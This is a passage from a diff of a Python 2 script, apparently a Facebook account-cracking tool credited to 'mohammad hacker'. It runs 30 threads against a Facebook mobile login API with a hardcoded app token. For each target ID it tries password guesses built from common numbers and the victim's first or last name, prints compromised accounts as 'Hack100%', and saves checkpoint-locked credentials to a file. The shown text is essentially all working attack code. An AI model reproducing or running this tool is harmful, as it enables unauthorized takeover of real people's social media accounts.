+			                                           if 'www.facebook.com' in q["error_msg"]:
+				                                       print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
+				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
+				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
+				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass4 + '\n'
+				                                       cek = open("out/super_cp.txt", "a")
+				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
+				                                       cek.close()
+				                                       cekpoint.append(user+pass4)					
+					                           else:									
+						                       pass5 = '786786'							
+						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
+						                       q = json.load(data)								
+						                       if 'access_token' in q:	
+						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				                                               z = json.loads(x.text)
+						                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'						
+						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']							
+						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user					
+						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass5 + '\n'							
+						                               oks.append(user+pass5)	
+                                                                       else:
+			                                                       if 'www.facebook.com' in q["error_msg"]:
+				                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
+				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
+				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
+				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass5 + '\n'
+				                                                   cek = open("out/super_cp.txt", "a")
+				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
+				                                                   cek.close()
+				                                                   cekpoint.append(user+pass5)					
+						                               else:								
+							                           pass6 = '1234554321'											
+			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
+			                                                           q = json.load(data)												
+			                                                           if 'access_token' in q:	
+								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				                                                           z = json.loads(x.text)
+				                                                           print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
+				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
+				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user									
+				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass6 + '\n'											
+				                                                           oks.append(user+pass6)
+                                                                                   else:
+			                                                                   if 'www.facebook.com' in q["error_msg"]:
+				                                                               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
+				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
+				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
+				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass6 + '\n'
+				                                                               cek = open("out/super_cp.txt", "a")
+				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
+				                                                               cek.close()
+				                                                               cekpoint.append(user+pass6)	
+						                                           else:							
+								                               pass7 = b['first_name']+'12345'						
+								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
+								                               q = json.load(data)						
+								                               if 'access_token' in q:		
+				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				                                                                       z = json.loads(x.text)
+									                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'					
+									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']					
+									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user				
+									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass7 + '\n'					
+									                               oks.append(user+pass7)
+                                                                                               else:
+			                                                                               if 'www.facebook.com' in q["error_msg"]:
+				                                                                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
+				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
+				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
+				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass7 + '\n'
+				                                                                           cek = open("out/super_cp.txt", "a")
+				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
+				                                                                           cek.close()
+				                                                                           cekpoint.append(user+pass7)           					
+								                                       else:						
+										                           pass8 = b['last_name'] + '12345'											
+			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
+			                                                                                   q = json.load(data)												
+			                                                                                   if 'access_token' in q:		
+										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				                                                                                   z = json.loads(x.text)
+				                                                                                   print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
+				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
+				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user										
+				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass8 + '\n'											
+				                                                                                   oks.append(user+pass8)
+                                                                                                           else:
+			                                                                                           if 'www.facebook.com' in q["error_msg"]:
+				                                                                                       print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
+				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
+				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
+				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass8 + '\n'
+				                                                                                       cek = open("out/super_cp.txt", "a")
+				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
+				                                                                                       cek.close()
+				                                                                                       cekpoint.append(user+pass8)   	
+										                                   else:					
+										                                       pass9 = b['first_name'] + '1234567890'					
+										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
+										                                       q = json.load(data)				
+										                                       if 'access_token' in q:		
+		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				                                                                                               z = json.loads(x.text)
+											                                       print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
+											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
+											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user	
+											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass9 + '\n'			
+											                                       oks.append(user+pass9)
+                                                                                                                       else:
+			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
+				                                                                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
+				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
+				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
+				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass9 + '\n'
+				                                                                                                   cek = open("out/super_cp.txt", "a")
+				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
+				                                                                                                   cek.close()
+				                                                                                                   cekpoint.append(user+pass9)		
+											                                       
+																	
+															
+		except:
+			pass
+		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlack404\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By mohammad hacker--•◈•---»" #Dev:MOHAMMAD
+	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 BlackID.py)↩\033[1;97m....'
+	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
+	print logo
+	
+	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
+	menu()
+
+if __name__ == '__main__':
+	login()
